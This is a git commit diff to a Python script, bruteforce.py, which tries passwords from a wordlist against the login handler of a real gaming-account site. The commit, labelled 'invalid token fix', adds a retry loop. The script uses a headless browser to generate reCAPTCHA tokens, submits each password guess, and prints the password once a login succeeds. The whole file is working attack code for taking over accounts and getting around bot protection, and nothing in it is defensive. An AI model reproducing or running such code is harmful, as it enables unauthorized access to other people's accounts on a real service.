2c33dddf2c9be2bf11da3cf7db69a6d083260afb
UHl0aG9uZWVy <ksdgdfjhgaskfgdjsgf@mail.ru>
2020-09-13 12:37:55 +0800

    invalid token fix

--- bruteforce.py
+++ bruteforce.py
@@ -8,6 +8,7 @@ from selenium import webdriver
 
 async def main():
 	session = aiohttp.ClientSession()
+
 	driver = webdriver.PhantomJS(executable_path='resources/phantomjs.exe')
 	driver.get('https://samp-mobile.com/account/')
 
@@ -25,34 +26,38 @@ async def main():
 	startTime = time.time()
 
 	for userPassword in base:
-		driver.execute_script("grecaptcha.ready(function() {grecaptcha.execute('6LfhuPcUAAAAAPTrbOFLnwQMXDbkTrwDeZ6xodrO', {action: 'homepage'}).then(function(token) {document.getElementById('g-recaptcha-response').value=token;});});")
-		g_recaptcha_response = driver.find_element_by_id('g-recaptcha-response')
-		g_recaptcha_response = g_recaptcha_response.get_attribute('value')
-		if g_recaptcha_response == '':
-			exit()
-		data = {
-			"user_name" : userName,
-			"user_password" : userPassword,
-			"act" : "account_login",
-			"g-recaptcha-response" : g_recaptcha_response
-		}
-
 		try:
 			id = base.index(userPassword)
 			workTime = time.time() - startTime
 			workSpeed = id / workTime
 		except:
 			pass
-
-		response = await session.post('https://samp-mobile.com/system/global_classes/Handler.php', data=data)
-		response = await response.json()
-		status = response['status']
-		if status == 'ok':
-			print(f'Верный пароль: {userPassword}')
-			input()
-			exit()
-		else:
-			print(f'Текущий пароль: {userPassword}')
+		while True:
+			driver.execute_script("grecaptcha.ready(function() {grecaptcha.execute('6LfhuPcUAAAAAPTrbOFLnwQMXDbkTrwDeZ6xodrO', {action: 'homepage'}).then(function(token) {document.getElementById('g-recaptcha-response').value=token;});});")
+			g_recaptcha_response = driver.find_element_by_id('g-recaptcha-response')
+			g_recaptcha_response = g_recaptcha_response.get_attribute('value')
+			if not g_recaptcha_response:
+				continue
+			data = {
+				"user_name" : userName,
+				"user_password" : userPassword,
+				"act" : "account_login",
+				"g-recaptcha-response" : g_recaptcha_response
+			}
+			response = await session.post('https://samp-mobile.com/system/global_classes/Handler.php', data=data)
+			response = await response.json()
+			status = response['status']
+			message = response['message']
+			if message == 'Вы не проходите проверку от Google Recaptcha.':
+				continue
+			else:
+				if status == 'ok':
+					print(f'Верный пароль: {userPassword}')
+					input()
+					exit()
+				else:
+					print(f'Текущий пароль: {userPassword}')
+					break
 
 loop = asyncio.get_event_loop()
 loop.run_until_complete(main())
